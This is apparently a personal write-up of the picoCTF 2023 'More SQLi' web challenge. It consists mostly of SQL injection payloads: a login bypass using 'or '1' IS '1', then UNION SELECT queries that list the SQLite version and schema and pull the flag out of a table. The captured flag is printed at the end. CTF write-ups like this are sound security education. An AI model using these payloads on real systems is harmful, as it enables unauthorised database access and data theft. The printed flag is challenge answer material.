# More SQLi

```markdown
Tags: `picoCTF2023` `Web Exploitation` `sql`
```

## **Description**

Can you find the flag on this website.

Additional details will be available after launching your challenge instance.

<figure><img src="../.gitbook/assets/image (46) (1).png" alt=""><figcaption></figcaption></figure>

```sql
Username: eiei
password: 'or '1' IS '1';--
```

```sql
SELECT id FROM users WHERE password = '1' IS '1'--' AND username = 'eiei'
```

## Welcome!

<figure><img src="../.gitbook/assets/image (47) (1).png" alt=""><figcaption></figcaption></figure>

```sql
TEST' UNION SELECT 7, sqlite_version(), 3--
```

<figure><img src="../.gitbook/assets/image (48) (1).png" alt=""><figcaption></figcaption></figure>

```sql
TEST' UNION SELECT name, sql, sqlite_version() from sqlite_master;--
```

<figure><img src="../.gitbook/assets/image (51).png" alt=""><figcaption></figcaption></figure>

```sql
TEST' UNION SELECT flag, null, null from more_table;--
```

<figure><img src="../.gitbook/assets/image (52).png" alt=""><figcaption><p>picoCTF{G3tting_5QL_1nJ3c7I0N_l1k3_y0u_sh0ulD_3b0fca37}</p></figcaption></figure>

## Follow Me

* **LinkedIn**: [https://www.linkedin.com/in/waris-damkham/](https://www.linkedin.com/in/waris-damkham/)
* **Website**: [https://waris-damkham.netlify.app/](https://waris-damkham.netlify.app/#home)
